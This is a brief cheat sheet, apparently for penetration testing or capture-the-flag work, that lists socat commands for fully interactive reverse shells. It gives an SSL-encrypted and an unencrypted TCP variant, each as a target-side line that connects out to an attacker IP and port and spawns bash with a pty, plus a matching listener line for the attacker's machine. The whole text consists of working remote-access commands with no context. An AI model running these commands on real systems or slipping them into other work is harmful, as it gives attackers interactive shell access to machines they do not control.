# SOCAT CHEATSHEET

### SSL Reverse Shell (Fully interactive)

```
# On target which will throw a connection
socat openssl-connect:YOUR-IP:YOUR-PORT,verify=1 exec:bash,pty,stderr,setsid,sigint,sane

# On your machine which will catch the connection
socat file:`tty`,raw,echo=0 openssl-listen:PORT,reuseaddr,cert=key.pem,verify=1
```

### TCP (Unencrypted) Reverse Shell (Fully interactive)

```
# On target which will throw a connection
socat tcp-connect:YOUR-IP:YOUR-PORT exec:bash,pty,stderr,setsid,sigint,sane

# On your machine which will catch the connection
socat file:`tty`,raw,echo=0 tcp-listen:PORT,reuseaddr
```